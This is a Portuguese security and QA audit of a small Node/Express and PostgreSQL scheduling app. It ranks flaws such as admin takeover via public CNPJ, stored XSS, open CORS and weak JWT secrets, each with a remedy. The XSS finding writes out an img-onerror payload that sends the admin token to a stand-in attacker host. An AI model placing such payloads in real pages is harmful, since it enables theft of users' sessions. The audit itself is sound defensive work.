# QA — Portal da Maria (v1.1.0)

> Relatório de auditoria técnica gerado a partir da leitura completa dos arquivos **atuais** na pasta do projeto (`Portal Da Maria - V1.1.0.html`, `api/`, `banco-schema.sql`, `README.md`, `LEIA-ME.md`, `DOCUMENTACAO-PORTAL-DA-MARIA.md`). Versões antigas do protótipo (v0.0.3, SIMULADO, Supabase) foram ignoradas conforme pedido — esta análise reflete só o que existe hoje: frontend em arquivo único + API própria Node/Express + PostgreSQL local.
>
> **Como usar:** cada ponto abaixo tem problema, onde está, risco/impacto e a solução recomendada (às vezes com uma alternativa mais estrutural). Pode ser colado inteiro num prompt para o assistente que está implementando o projeto — cada seção é independente e acionável.

---

## Resumo executivo

| Nº | Ponto | Severidade | Área |
|---|---|---|---|
| 1.1 | Qualquer pessoa vira admin de uma unidade real sabendo o CNPJ | **Crítico** | Segurança / regra de negócio |
| 1.2 | XSS persistente via comentário de avaliação e pedido público → roubo do token de admin | **Crítico** | Segurança |
| 2.1 | CORS totalmente aberto | Alto | Segurança |
| 2.2 | Sem rate limiting em login/cadastro/pedido público | Alto | Segurança |
| 2.3 | Sem validação de força de senha / formato de e-mail / telefone no backend | Alto | Segurança / integridade |
| 2.4 | `prestadora_id`/`cliente_id` não validados contra a unidade ao atribuir atendimento | Alto | Integridade de dados |
| 2.5 | `JWT_SECRET` fraco por padrão, sem checagem no start da API | Alto | Segurança |
| 3.1 | Bug de fuso horário na regra "confirmar a partir de 2 dias antes" | Médio | Lógica de negócio |
| 3.2 | Erro de validação de `nota` vira 500 genérico em vez de 400 | Médio | Robustez |
| 3.3 | Sem paginação nas listagens | Médio | Escalabilidade |
| 3.4 | Frontend não trata token expirado/401 globalmente | Médio | UX / robustez |
| 3.5 | Token JWT em `localStorage` sem nenhuma mitigação extra | Médio | Segurança (defesa em profundidade) |
| 3.6 | E-mail/telefone sem normalização antes do `unique` | Médio | Integridade de dados |
| 4.1 | Frontend inteiro num único HTML de ~166 KB / 4400 linhas | Baixo | Manutenibilidade |
| 4.2 | Zero testes automatizados | Baixo | Manutenibilidade |
| 4.3 | Sem `.gitignore` na raiz do repositório | Baixo | Higiene de repositório |
| 4.4 | Documentação técnica desatualizada (descreve o protótipo v0.0.3 como se fosse o atual) | Baixo | Documentação |
| 4.5 | `API_BASE` fixo em `localhost` sem variável de ambiente | Baixo | Preparação p/ produção |

---

## 1. CRÍTICO

### 1.1 — Qualquer pessoa pode virar administrador de uma unidade real, só sabendo o CNPJ

**Onde:** `api/src/routes/auth.js`, rota `POST /cadastro/admin`.

**Problema:** o cadastro de administrador (franqueado) associa a conta a qualquer unidade cujo CNPJ bata com o array `cnpjs` enviado no corpo da requisição — sem nenhuma verificação de que quem está se cadastrando é, de fato, dono daquela franquia:

```js
const { rows: unidades } = await client.query(
  `select id, slug, nome from unidades where cnpj = any($1::text[])`,
  [cnpjs]
);
...
for (const unidade of unidades) {
  await client.query(`insert into administrador_unidades (administrador_id, unidade_id) values ($1, $2)`, ...);
}
```

CNPJ é um dado **público** (consta em notas fiscais, Receita Federal, Google Maps, etc.). A tela de cadastro mostra um passo de "código de verificação por e-mail" (`enviarCodigo` / `confirmarCodigo` no frontend), mas ele é **puramente cosmético**: a tabela `codigos_verificacao` existe no schema, mas nenhuma rota da API a consulta ou grava nela. O backend nunca checa o código — ele aceita o cadastro direto.

**Risco:** qualquer pessoa que descubra o CNPJ de uma unidade Maria Brasileira (ex.: concorrente, ex-funcionário, cliente insatisfeito) consegue se auto-cadastrar como administrador completo daquela unidade e enxergar/alterar agenda, equipe, clientes, avaliações e o telefone de WhatsApp da franquia. É o ponto mais grave do sistema porque não depende de nenhuma outra falha — é a regra de negócio da rota que está incompleta.

**Solução recomendada:** implementar de fato o fluxo de verificação antes de vincular a unidade:
1. `POST /cadastro/admin` passa a gerar um registro em `codigos_verificacao` (destino = e-mail informado) e retornar sem token ainda, pedindo confirmação.
2. Novo endpoint `POST /cadastro/admin/confirmar` recebe e-mail + código, valida contra `codigos_verificacao` (checando `usado` e `expira_em`), só então cria o administrador e associa as unidades, e aí sim emite o JWT.
3. Como o envio real de e-mail está fora de escopo por ora, o valor mínimo aceitável é pelo menos **logar o código no console do servidor** (não simplesmente aceitar qualquer coisa) até a integração de e-mail existir — mas isso é solução de curtíssimo prazo, não o destino final.

**Alternativa mais estrutural** (caso o fluxo por e-mail não seja prioridade agora): trocar CNPJ por um **código de convite** que só o franqueado já cadastrado (ou um admin do sistema) pode gerar e entregar pessoalmente/por outro canal já confiável — elimina a dependência de um dado público como "prova de propriedade" da unidade.

---

### 1.2 — XSS persistente via comentário de avaliação e via pedido público → roubo do token de sessão do administrador

**Onde:** `Portal Da Maria - V1.1.0.html`, renderizações que usam `innerHTML` com dados vindos da API sem nenhum escape (linhas ~3896, ~4057, ~4202-4204, ~4323-4326 no arquivo atual) + `api/src/routes/avaliacoes.js` (`POST /avaliacoes`, aceita `comentario` livre) + `api/src/routes/atendimentos.js` (`POST /` — pedido de orçamento público, aceita `tipo_servico`/`area` livres).

**Problema (a cadeia completa):**
1. `POST /api/atendimentos` (pedido de orçamento) é uma rota **pública, sem autenticação**, e aceita `tipo_servico`/`area` como texto livre, sem limite de tamanho e sem sanitização.
2. `POST /api/avaliacoes` (avaliação do cliente) aceita `comentario` como texto livre, também sem sanitização.
3. No frontend, esses campos são jogados direto em `innerHTML` via template string, sem nenhuma função de escape — por exemplo:
   ```js
   document.getElementById('adm-aval-pend').innerHTML = pend.map(a =>
     `...${a.comentario ? ' — "' + a.comentario + '"' : ''}...`
   ).join('');
   ```
   O mesmo padrão se repete para `item.tipo_servico`/`area` na timeline da agenda do admin, e para `comentario`/`cliente` na tela da prestadora. Não existe **nenhuma** função `escapeHtml`/`sanitize` no arquivo inteiro (confirmado por busca no código).
4. O token de sessão (JWT) é guardado em `localStorage.getItem('pm-token')`, acessível por qualquer script rodando na página.

**Risco:** um atacante não-autenticado envia um pedido de orçamento (ou um cliente comum envia uma "avaliação") com algo como `tipo_servico = "<img src=x onerror=fetch('https://atacante.com/x?t='+localStorage.getItem('pm-token'))>"`. Quando o **administrador** abrir a agenda do dia (ou a tela de moderação de avaliações), o script executa no navegador dele e envia o token JWT (válido por 7 dias) para o atacante — que passa a ter acesso administrativo completo àquela unidade sem nunca ter feito login. É a combinação mais perigosa possível: um vetor **não autenticado** (o pedido público) atingindo a conta de **maior privilégio** (o admin).

**Solução recomendada:**
1. Criar uma função central `escapeHtml(str)` (ou usar `textContent`/`createElement` em vez de `innerHTML` nos trechos que exibem dado do usuário) e aplicar em **todo** campo que venha de `atendimentos.tipo_servico/area`, `avaliacoes.comentario`, e qualquer outro texto livre de cliente/prestadora antes de interpolar em `innerHTML`. Dado o volume de ocorrências (22 usos de `innerHTML` no arquivo), vale um refactor único: um helper `html\`...\`` (tagged template) que escapa automaticamente os valores interpolados, trocando as ~15 ocorrências problemáticas de uma vez.
2. No backend, adicionar limite de tamanho (`maxLength`) em `tipo_servico`, `area` e `comentario` nas rotas `POST /atendimentos` e `POST /avaliacoes` — reduz superfície de abuso mesmo depois do escape corrigido.
3. **Defesa em profundidade** (complementar, não substitui o item 1): considerar mover o JWT de `localStorage` para um cookie `httpOnly` + `Secure` + `SameSite=Strict`, servido pela própria API. Isso é uma mudança maior (a API passaria a setar cookie no login/cadastro e o frontend pararia de mandar `Authorization: Bearer`), mas elimina de vez a possibilidade de um XSS roubar o token, mesmo que aaparecer um novo ponto de injeção no futuro.

---

## 2. ALTO

### 2.1 — CORS totalmente aberto

**Onde:** `api/src/server.js`, linha `app.use(cors());`.

**Problema:** `cors()` sem opções libera requisições de **qualquer origem**. Hoje o impacto prático é baixo (autenticação é via `Authorization: Bearer`, não cookie, então CSRF clássico não se aplica), mas qualquer site pode fazer requisições à API em nome de quem estiver com a aba aberta e, combinado com o XSS do item 1.2 ou qualquer vazamento futuro do token, facilita exfiltração de dados.

**Solução recomendada:** restringir a uma allowlist explícita via variável de ambiente:
```js
const origensPermitidas = (process.env.CORS_ORIGINS || 'http://localhost:5000').split(',');
app.use(cors({ origin: origensPermitidas }));
```
Mantém o `npx serve` / Live Server local funcionando e já deixa pronto para quando houver um domínio de produção.

---

### 2.2 — Sem rate limiting em login, cadastro e pedido público

**Onde:** `api/src/routes/auth.js` (`/login`, `/cadastro/*`) e `api/src/routes/atendimentos.js` (`POST /`).

**Problema:** nenhuma dessas rotas tem limite de tentativas. `/login` aceita tentativas ilimitadas de senha (brute force viável contra qualquer conta, inclusive admin); `POST /atendimentos` aceita volume ilimitado de "pedidos" de qualquer IP (spam/flood na agenda de uma unidade, além de ser o vetor do XSS do item 1.2).

**Solução recomendada:** adicionar `express-rate-limit` (dependência leve, já no ecossistema Express usado no projeto):
```js
const rateLimit = require('express-rate-limit');
const limiteLogin = rateLimit({ windowMs: 15 * 60 * 1000, max: 10 });
router.post('/login', limiteLogin, async (req, res) => { ... });
```
Aplicar um limite mais generoso, mas ainda presente, em `/cadastro/*` e `POST /atendimentos`.

---

### 2.3 — Sem validação de força de senha, formato de e-mail ou de telefone no backend

**Onde:** `api/src/routes/auth.js`, todas as rotas de cadastro.

**Problema:** a validação hoje é só "o campo existe" (`if (!nome || !senha ...)`). Uma senha de 1 caractere é aceita e vira hash bcrypt normalmente; `email` não passa por nenhuma checagem de formato; `telefone` idem.

**Solução recomendada:** validação simples e centralizada, sem precisar de biblioteca nova:
```js
function senhaValida(s) { return typeof s === 'string' && s.length >= 8; }
function emailValido(e) { return typeof e === 'string' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e); }
```
Aplicar nas 3 rotas de cadastro, retornando 400 com mensagem clara. Se o projeto crescer, migrar para uma lib como `zod` para validar o `req.body` inteiro de forma declarativa é o próximo passo natural (também resolve o item 2.4 abaixo, ao validar UUIDs de `prestadora_id`/`cliente_id`).

---

### 2.4 — `prestadora_id`/`cliente_id` não são validados contra a unidade ao atribuir um atendimento

**Onde:** `api/src/routes/atendimentos.js`, rotas `POST /admin/:slug/:id/propor`, `POST /admin/:slug/:id/reatribuir` e `POST /admin/:slug/recorrente`.

**Problema:** essas rotas recebem `prestadora_id` (e, na recorrência, também `cliente_id`) direto do corpo da requisição e gravam sem checar se aquele ID pertence à unidade (`req.unidadeId`) que o admin está de fato administrando:
```js
const { rows: [atendimento] } = await pool.query(
  `update atendimentos set prestadora_id = $1, status = 'proposto', ...
   where id = $2 and unidade_id = $3 and status = 'pedido' returning *`,
  [prestadora_id, req.params.id, req.unidadeId]
);
```
O `where unidade_id = $3` protege o **atendimento**, mas não garante que a `prestadora_id` informada seja de fato uma prestadora *daquela* unidade — um admin (ou sub-admin) que conheça/adivinhe o UUID de uma prestadora de outra unidade consegue atribuí-la a um atendimento que não é dela. Isso quebra a visão por unidade nas telas de equipe/dashboard (`vw_equipe_unidade`, `vw_dashboard_unidade`) de forma silenciosa, e não tem nenhuma constraint no banco impedindo isso.

**Solução recomendada:** validar o vínculo antes do `UPDATE`/`INSERT`, junto com a checagem que `permissoes.js` já faz para o admin↔unidade:
```js
async function prestadoraDaUnidade(id, unidadeId) {
  const { rows: [p] } = await pool.query(
    'select id from prestadoras where id = $1 and unidade_id = $2', [id, unidadeId]
  );
  return !!p;
}
```
e chamar isso (retornando 400 se falhar) em `/propor`, `/reatribuir` e em cada item de `/recorrente` antes de inserir. O mesmo vale para `cliente_id` quando informado.

---

### 2.5 — `JWT_SECRET` fraco por padrão, sem checagem no start da API

**Onde:** `api/.env.example` (`JWT_SECRET=troque-este-segredo`) e `api/src/server.js` (nenhuma validação de variáveis de ambiente no boot).

**Problema:** se alguém subir a API com o `.env` copiado do exemplo e esquecer de trocar o `JWT_SECRET`, a API sobe normalmente e assina tokens com um segredo previsível e público (está literalmente neste repositório). Não há nenhum "fail-fast" impedindo isso.

**Solução recomendada:** validar no boot do `server.js`:
```js
if (!process.env.JWT_SECRET || process.env.JWT_SECRET === 'troque-este-segredo' || process.env.JWT_SECRET.length < 32) {
  console.error('JWT_SECRET ausente ou fraco — defina uma string aleatória longa em api/.env');
  process.exit(1);
}
```
Mesmo raciocínio vale para `PGPASSWORD` se algum dia o banco for exposto além do `localhost`.

---

## 3. MÉDIO

### 3.1 — Bug de fuso horário na regra "prestadora só confirma a partir de 2 dias antes"

**Onde:** `api/src/routes/atendimentos.js`, rota `POST /prestadora/me/:id/aceitar`.

```js
const hojeISO = new Date().toISOString().slice(0, 10);
const dataISO = atual.data_atendimento.toISOString().slice(0, 10);
const diasRestantes = Math.round((new Date(dataISO) - new Date(hojeISO)) / 86400000);
```

**Problema:** `new Date().toISOString()` converte para **UTC**, não para o fuso do Brasil (America/Sao_Paulo, UTC-3). Entre ~21h e 23h59 (horário de Brasília), o UTC já virou o dia seguinte — então `hojeISO` "adianta" um dia mais cedo do que deveria, e a regra de "2 dias antes" fica, na prática, "2 dias e algumas horas antes" ou "1 dia antes", dependendo do horário exato em que a prestadora tenta confirmar. É um bug sutil (só aparece em certas janelas de horário) mas afeta diretamente uma regra de negócio que o projeto trata como importante.

**Solução recomendada:** calcular a data de "hoje" no fuso correto, sem depender de `toISOString()`:
```js
const hojeISO = new Date().toLocaleDateString('en-CA', { timeZone: 'America/Sao_Paulo' }); // 'YYYY-MM-DD'
```
(`toLocaleDateString('en-CA', ...)` é um jeito simples de obter `YYYY-MM-DD` sem biblioteca extra; se o projeto crescer, vale padronizar datas com uma lib como `date-fns-tz` em vez de repetir esse cálculo manualmente em outros lugares.)

---

### 3.2 — Erro de validação de `nota` vira 500 genérico em vez de 400 claro

**Onde:** `api/src/routes/avaliacoes.js`, `POST /` + `banco-schema.sql` (`check (nota between 1 and 5)`).

**Problema:** a integridade está garantida pelo `CHECK` do banco (isso é bom — ver seção 5), mas a rota não valida `nota` antes de mandar pro Postgres. Se o frontend (ou um cliente de API externo) mandar `nota = 0` ou `nota = 99`, o Postgres rejeita com um erro de constraint, que cai no `catch` genérico e vira `{ erro: 'Erro interno do servidor' }` com status 500 — uma mensagem que não ajuda o usuário nem quem for debugar depois.

**Solução recomendada:**
```js
if (!Number.isInteger(nota) || nota < 1 || nota > 5) {
  return res.status(400).json({ erro: 'nota deve ser um número inteiro entre 1 e 5' });
}
```
antes do `INSERT`. Padrão a repetir: sempre que existir uma constraint de banco protegendo uma regra, vale espelhar a mesma checagem na rota para devolver 400 em vez de deixar o banco "estourar" em 500.

---

### 3.3 — Sem paginação nas listagens

**Onde:** `equipe`, `clientes`, `avaliacoes` (histórico) em `unidades.js`/`avaliacoes.js` — todas retornam a tabela inteira da unidade de uma vez.

**Problema:** hoje, com 2 unidades e poucos dados de exemplo, não há impacto. Mas não existe nenhum `LIMIT`/`OFFSET` (ou cursor) em nenhuma dessas rotas — o crescimento natural do sistema (mais clientes, mais histórico de avaliações) vai degradar essas telas sem aviso.

**Solução recomendada:** não é urgente agora, mas vale já deixar o padrão pronto para quando for necessário — `?pagina=1&porPagina=50` nas rotas de listagem, com `LIMIT`/`OFFSET` nas queries. Baixa prioridade, mas mais barato de resolver cedo do que depois que as telas já dependerem do formato de resposta atual (array puro, sem metadados de paginação).

---

### 3.4 — Frontend não trata token expirado / 401 de forma global

**Onde:** `Portal Da Maria - V1.1.0.html`, função `api()` (linha ~3428).

**Problema:** `api()` lança um `Error` genérico em qualquer resposta não-ok, mas não existe nenhum tratamento especial para `401` (token expirado ou inválido, o que acontece naturalmente após 7 dias, ou se o `JWT_SECRET` mudar). O usuário fica numa tela autenticada vendo erros de "Erro 401" espalhados nos `toast()` de cada ação, sem ser redirecionado para o login.

**Solução recomendada:** no `catch` de `api()`, tratar `401` centralizadamente:
```js
if (res.status === 401) { logout(); toast('Sessão expirada, faça login novamente.'); }
```
(usando a função `logout()` que já existe no arquivo).

---

### 3.5 — Token JWT em `localStorage` sem nenhuma mitigação adicional

**Onde:** arquitetura geral (`pm-token` em `localStorage`).

**Problema:** já coberto como causa raiz do item 1.2. Listado aqui separadamente porque, mesmo depois de corrigir o XSS pontual, `localStorage` continua sendo acessível por qualquer script que rodar na página (extensões de navegador maliciosas, uma dependência de terceiros comprometida no futuro, etc.) — é uma escolha arquitetural que vale revisitar, não só o sintoma.

**Solução recomendada:** ver a alternativa estrutural do item 1.2 (cookie `httpOnly`). Não é bloqueante agora que o app roda 100% local para um TCC, mas é o primeiro item a resolver antes de qualquer deploy público.

---

### 3.6 — E-mail e telefone sem normalização antes da constraint `unique`

**Onde:** `banco-schema.sql` (`clientes.email unique`, `administradores.email unique`, `prestadoras.telefone unique`) + rotas de cadastro/login em `auth.js`.

**Problema:** o telefone é salvo exatamente como veio do formulário (ex.: `"(54) 9 9000-0001"`), sem normalização (remover espaços/parênteses/traços) antes de gravar ou comparar. Como o login por telefone faz `where telefone = $1` (comparação exata), duas variações de formatação do mesmo número viram duas contas diferentes na prática, ou impedem login se a prestadora digitar de um jeito ligeiramente diferente do cadastro. O mesmo vale, com menor risco, para `email` (maiúsculas/minúsculas: `Nome@Site.com` vs `nome@site.com` hoje são e-mails "diferentes" para o `unique`).

**Solução recomendada:** normalizar antes de gravar/comparar:
```js
const telefoneNormalizado = telefone.replace(/\D/g, '');       // só dígitos
const emailNormalizado = email.trim().toLowerCase();
```
aplicado tanto no cadastro quanto no login, e usado como o valor efetivamente salvo/comparado no banco (idealmente com uma migração para normalizar os dados de exemplo já existentes).

---

## 4. BAIXO — Manutenibilidade e dívida técnica

### 4.1 — Frontend inteiro em um único arquivo HTML (~166 KB / ~4400 linhas)

**Problema:** todo o CSS, HTML de 6 telas e toda a lógica JS (renderização, chamadas de API, estado) vivem em `Portal Da Maria - V1.1.0.html`. Funciona hoje porque o app é servido por um Live Server simples, sem build step — mas à medida que o projeto cresce (e já tem bastante lógica de negócio: recorrência, permissões por módulo, calendário), fica cada vez mais caro achar/alterar coisas com segurança num arquivo desse tamanho, e o risco de duas partes do código divergirem silenciosamente (ex.: duas cópias parecidas de uma função de formatação) aumenta.

**Solução recomendada (curto prazo, sem mudar arquitetura):** pelo menos separar em 3 arquivos estáticos (`app.css`, `app.js`, `index.html`) — zero mudança de comportamento, só organização, continua funcionando com Live Server/`npx serve` sem build step.

**Alternativa mais estrutural** (já que o pedido permite sugerir reformas maiores): migrar para um bundler leve (Vite, sem framework, ou com um pouco de componentização se fizer sentido) — dá separação por tela/módulo, hot reload de verdade, e um lugar natural para colocar o `escapeHtml`/templating do item 1.2 como utilitário compartilhado, além de abrir caminho pra variável de ambiente (`API_BASE`) resolver o item 4.5. É trabalho maior, então vale fazer só depois de resolver os itens de segurança acima — mas é o destino natural se o projeto continuar crescendo além do TCC.

---

### 4.2 — Zero testes automatizados

**Problema:** não há nenhum arquivo de teste (unitário ou de integração) nem no frontend nem em `api/`. Toda a lógica de recorrência (geração de até 200 linhas, semanas alternadas), a regra dos 2 dias, e as checagens de permissão por módulo dependem inteiramente de teste manual.

**Solução recomendada:** começar pelo que tem mais lógica pura e mais risco de regressão — a função de geração de recorrência em `atendimentos.js` e `acessoAdminUnidade`/`unidadeDoAdmin` em `permissoes.js` — com testes de integração simples usando `node:test` (nativo do Node, sem dependência nova) batendo direto na API local, ou extraindo a lógica de datas da recorrência para uma função pura testável isoladamente.

---

### 4.3 — Sem `.gitignore` na raiz do repositório

**Onde:** raiz do projeto — só existe `.gitignore` dentro de `api/` (que corretamente ignora `node_modules/` e `.env`).

**Problema:** não há um `.gitignore` na raiz cobrindo a pasta `.claude/` (que hoje tem `settings.local.json` com comandos de teste local, incluindo hashes bcrypt e senhas de teste usadas em `curl` durante o desenvolvimento) nem outros artefatos locais que possam aparecer fora de `api/`. Vale confirmar com `git status`/`git ls-files` se `.claude/settings.local.json` já está sendo versionado — se estiver, ele deveria sair do controle de versão (é configuração de máquina local, não do projeto).

**Solução recomendada:** criar um `.gitignore` na raiz:
```
.claude/settings.local.json
node_modules/
.env
```
e, se `.claude/settings.local.json` já estiver commitado, rodar `git rm --cached .claude/settings.local.json` para parar de versioná-lo (o histórico antigo continua existindo no git, mas ao menos não recebe mais atualizações).

---

### 4.4 — Documentação técnica desatualizada

**Onde:** `DOCUMENTACAO-PORTAL-DA-MARIA.md`.

**Problema:** o documento se identifica no título como "v0.0.3" e descreve extensivamente o protótipo estático sem backend ("não há persistência real", "não há validação de credenciais — é um mock") como se fosse o estado atual, com uma única seção no final (seção 7) reconhecendo que tudo mudou para v1.1.0. Isso é uma armadilha para quem (pessoa ou IA) ler o documento de cima para baixo e assumir que as seções 1-6 ainda valem.

**Solução recomendada:** reescrever o documento a partir do estado atual (API real, banco real, sem Supabase), mantendo a seção de rastreabilidade tela→tabela (que ainda é útil) mas atualizando a introdução e removendo a moldura "isso é tudo mockado". O `LEIA-ME.md` já está atualizado e pode servir de referência do que é real hoje.

---

### 4.5 — `API_BASE` fixo em `localhost`, sem variável de ambiente

**Onde:** `Portal Da Maria - V1.1.0.html`, `const API_BASE = "http://localhost:3001/api";`.

**Problema:** consistente com o projeto rodar "100% local" hoje (declarado no README, é um TCC), mas é um hardcode que vai exigir editar o HTML na mão no dia em que o projeto for hospedado em algum lugar.

**Solução recomendada:** não é urgente agora. Quando o build step do item 4.1 (Vite ou similar) for adotado, isso se resolve de graça via variável de ambiente (`import.meta.env.VITE_API_BASE`); sem build step, uma alternativa simples é detectar o host automaticamente (`location.hostname === 'localhost' ? ... : ...`) como paliativo.

---

## 5. O que já está bem feito

Vale registrar para o assistente que for mexer no código não "consertar" o que não está quebrado:

- **100% das queries revisadas usam parâmetros (`$1, $2...`)** — nenhuma concatenação de string vinda de `req.body`/`req.params` em SQL. Isso já elimina a classe mais comum de vulnerabilidade em APIs desse tipo.
- **Autorização sempre reconferida no banco**, nunca só confiando no que o JWT diz — `permissoes.js` deixa isso explícito em comentário e todas as rotas de admin passam por `requireAcessoUnidade`/`requireRole`.
- **Separação clara** entre `routes/`, `middleware/` e `utils/`, com responsabilidade única por arquivo — mais fácil de auditar do que um único arquivo de rotas.
- **Senha sempre com bcrypt** (custo 10), nunca texto puro nem hash fraco (MD5/SHA1).
- **Transações (`BEGIN`/`COMMIT`/`ROLLBACK`)** usadas corretamente nos inserts em lote que precisam ser atômicos (cadastro de admin + vínculo de unidades; geração de recorrência).
- **Trava de segurança explícita** (limite de 200 linhas) no gerador de atendimentos recorrentes, evitando que um input absurdo gere uma quantidade descontrolada de registros.
- **Comentários de decisão de arquitetura no meio do código** (ex.: por que CNPJ não é controle de acesso, por que a regra dos 2 dias existe, por que sub-administradores não podem se auto-gerenciar) — isso ajuda muito quem for dar manutenção depois, inclusive uma IA lendo o código pela primeira vez.
- **`.gitignore` da API já correto** (`node_modules/`, `.env` fora do controle de versão).

---

## Ordem sugerida de ataque

1. **1.1 e 1.2** primeiro — são os dois pontos onde alguém de fora, sem conta nenhuma, consegue causar dano real.
2. **2.1 a 2.5** em seguida — fecham a superfície de ataque restante (CORS, brute force, segredo fraco, integridade entre unidades).
3. **3.x** conforme o tempo permitir — nenhum é urgente sozinho, mas todos são baratos de corrigir agora e caros de corrigir depois que o app tiver mais usuários reais.
4. **4.x** é trabalho de fundo — pode ser feito em paralelo ou depois, sem pressa, exceto o `.gitignore` da raiz (4.3), que é rápido e vale fazer já.
